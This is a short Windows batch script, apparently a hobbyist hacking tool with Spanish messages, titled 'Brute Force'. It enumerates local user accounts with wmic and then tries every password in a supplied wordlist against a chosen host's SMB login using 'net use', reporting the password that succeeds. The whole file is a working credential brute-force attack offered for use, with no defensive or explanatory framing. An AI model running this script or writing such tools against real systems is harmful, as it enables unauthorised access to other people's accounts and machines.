@echo off
title Brute Force - Maykel Millan
color 6
echo                                   Bienvenido a Brute-Force

wmic useraccount get name,sid,status

set /p user="Username >> "
set /p ip="Address >> "
set /p list="WordList >> "
set /a count=0

:loop
for /f "tokens=*" %%a in (%list%) do (
    set "pass=%%a"
    call :attempt
    set /a count+=1
)
color 4
echo Password no encontrada :(
pause
exit /b

:success
color a
echo Password Encontrada : %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit 

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 goto success
echo [INTENTO: %count%][%pass%]
exit /b